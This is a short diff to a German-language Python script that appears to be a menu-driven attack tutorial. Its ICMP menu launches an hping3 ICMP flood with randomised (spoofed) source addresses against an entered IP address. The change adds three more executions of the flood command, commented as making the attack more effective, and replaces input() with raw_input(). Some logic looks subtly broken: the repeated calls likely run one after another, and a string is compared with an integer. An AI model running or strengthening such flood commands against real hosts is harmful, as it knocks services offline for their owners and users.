@@ -34,7 +34,12 @@ def ICMP_MENU():
 		print("Jetzt erst beginnt der tatsächliche Angriff.\nDer Angriff kann jederzeit mit CTRL+C abgebrochen werden.")
 		
 		command = rlinput('Starten des Ping-Floodings mit: \n# ', 'hping3 --flood --rand-source --icmp ' + ip_adress )
+		# Starte hping3 mehrfach um einen effektiveren Angriff durchzuführen
 		execute(command)
+		execute(command)
+		execute(command)
+		execute(command)
+
 		
 		
 
@@ -43,7 +48,7 @@ def ICMP_MENU():
 		print ('1. Zurück zum Menü \n'
 			+ '2. Zurück zum Start des Tutorials\n' 
 			+ '0. Tutorial beenden \n')
-		selection = input("Die Auswahl bitte hier eingeben und mit Enter bestätigen: ")
+		selection = raw_input("Die Auswahl bitte hier eingeben und mit Enter bestätigen: ")
 		if(selection==1):
 			attack = False
 			return True
